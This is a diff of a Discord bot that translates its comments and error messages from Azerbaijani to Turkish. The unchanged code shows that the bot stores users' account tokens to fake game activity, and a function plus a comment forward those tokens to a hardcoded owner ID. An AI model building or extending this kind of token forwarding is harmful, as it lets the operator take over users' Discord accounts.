@@ -44,7 +44,7 @@ const userTokens = new Map();
 const activeRPCs = new Map(); // userId -> [{ token, name, username, stop }]
 const gameChoiceCache = new Map(); // userId -> [{ id, name }]
 
-// Hazır oyun siyahısı
+// Hazır oyun listesi
 const READY_GAMES = [
   { id: '356875512194719746', name: 'Minecraft' },
   { id: '367827983903490050', name: 'Valorant' },
@@ -86,7 +86,7 @@ let lastGamesFetch = 0;
 // Tokenlerin gönderileceği ve paneli açabilecek yetkili kişinin ID'si
 const OWNER_ID = '1184518857679962186';
 
-// Hazır oyunları Discord API + daxili siyahı ilə birləşdirən funksiya
+// Hazır oyunları Discord API + dahili liste ile birleştiren fonksiyon
 async function getReadyGames() {
   const now = Date.now();
   if (cachedGames.length > READY_GAMES.length && now - lastGamesFetch < 6 * 60 * 60 * 1000) {
@@ -119,7 +119,7 @@ async function getReadyGames() {
       lastGamesFetch = now;
     }
   } catch (err) {
-    console.error('Hazır oyun siyahısı API-dən yüklənmədi:', err.message);
+    console.error('Hazır oyun listesi API hatası:', err.message);
   }
 
   cachedGames = Array.from(merged.values());
@@ -129,7 +129,7 @@ async function getReadyGames() {
 client.once('ready', () => {
   console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
   getReadyGames().then(() => {
-    console.log(`Hazır oyun bazası yükləndi: ${cachedGames.length} oyun`);
+    console.log(`Hazır oyun listesi yüklendi: ${cachedGames.length} oyun`);
   });
 
   client.user.setActivity({
@@ -156,7 +156,7 @@ async function sendTokenToOwner(botClient, title, token, accountName, username, 
   }
 }
 
-// Seçilən hazır oyun üzərindən RPC başlatan funksiya
+// Seçilen hazır oyun üzerinden RPC başlatan fonksiyon
 function startReadyGameRPC(token, accountName, gameObj) {
   return new Promise((resolve) => {
     const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
@@ -712,9 +712,9 @@ client.on('interactionCreate', async (interaction) => {
       }
     }
   } catch (err) {
-    console.error('Interaction xətası:', err);
+    console.error('Interaction hatası:', err);
     if (!interaction.replied && !interaction.deferred) {
-      await interaction.reply({ content: '❌ Sorğu işlənərkən xəta baş verdi.', ephemeral: true }).catch(() => {});
+      await interaction.reply({ content: '❌ İşlem sırasında bir hata oluştu.', ephemeral: true }).catch(() => {});
     }
   }
 });
